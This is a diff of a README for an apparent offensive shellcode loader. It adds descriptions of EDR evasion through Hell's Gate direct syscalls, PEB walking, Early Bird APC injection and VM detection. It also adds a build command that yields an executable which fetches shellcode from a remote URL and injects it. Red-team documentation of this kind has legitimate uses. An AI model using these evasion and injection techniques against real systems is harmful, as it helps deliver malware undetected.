@@ -36,6 +36,14 @@ This tool is intended **exclusively for academic and ethical penetration testing
 
 <img width="1706" height="329" alt="image" src="https://github.com/user-attachments/assets/61b9a1b0-d90d-4a81-a698-c39ee6e23b7c" />
 
+## Direct Syscall Implementation
+The framework implements the Hell's Gate technique to perform direct system calls, bypassing EDR userland hooks on NT API functions.
+
+## PEB Walking for NTDLL Resolution
+The framework implements robust PEB (Process Environment Block) walking to locate ntdll.dll without relying on standard APIs that may be hooked.
+
+## Process Injection Evasion
+The Early Bird APC injection technique combined with direct syscalls provides multiple layers of evasion against behavioral monitoring and EDR solutions.
 
 ### 🔧 Core Features
 
@@ -48,6 +56,14 @@ This tool is intended **exclusively for academic and ethical penetration testing
 | **Anti-Analysis** | Detects VM environments (VMware, VirtualBox, QEMU, Xen) via registry checks and exits if detected. |
 | **Manual HTTP Client** | Implements a minimal HTTP 1.1 client using WinSock to avoid `WinINet`/`WinHTTP` detection. |
 | **Stackless Compilation** | Compiled with `-fno-stack-protector` and optimized for size (`-Os`) to reduce footprint. |
+
+| **NT API Function**	| Purpose	| Syscall Usage  | 
+|---------------------|---------|----------------|
+| **NtAllocateVirtualMemory** |	Allocate RWX memory in target process |	HellsGate(ssn_alloc) + HellDescent() |
+| **NtWriteVirtualMemory** |	Write shellcode to allocated memory |	HellsGate(ssn_write) + HellDescent() |
+| **NtProtectVirtualMemory** |	Change memory protection to executable |	HellsGate(ssn_protect) + HellDescent() |
+| **NtQueueApcThread** |	Queue APC for shellcode execution |	HellsGate(ssn_apc) + HellDescent() |
+| **NtResumeThread** |	Resume suspended thread to trigger APC |	HellsGate(ssn_resume) + HellDescent() |
 
 
 <img width="1401" height="707" alt="image" src="https://github.com/user-attachments/assets/268a2750-ede9-4967-ab20-378f29fd5acb" />
@@ -67,13 +83,22 @@ sudo apt install mingw-w64
 ```
 ### Build
 ```bash
-./gen_ebird3.sh \
+./gen_hellbird3.sh \
   --target windows \
   --url "http://192.168.1.100/shellcode.txt" \
   --process-name "C:/Windows/System32/calc.exe" \
   --key 0x33
 ```
-> ✅ Output: ebird2.exe — a fully self-contained Windows executable.
+> ✅ Output: hellbird.exe — a fully self-contained Windows executable.
+
+### Compilation Flags Analysis
+#### Flag	Purpose	Security Impact
+
+- -lws2_32	Link Winsock library	Network functionality
+- -s	Strip symbols	Anti-analysis
+- -Os	Optimize for size	Reduced footprint
+- -fno-stack-protector	Disable stack protection	Evasion technique
+- -static	Static linking	Standalone executable
 
 ## 🧩 Code Architecture
 1. String Obfuscation
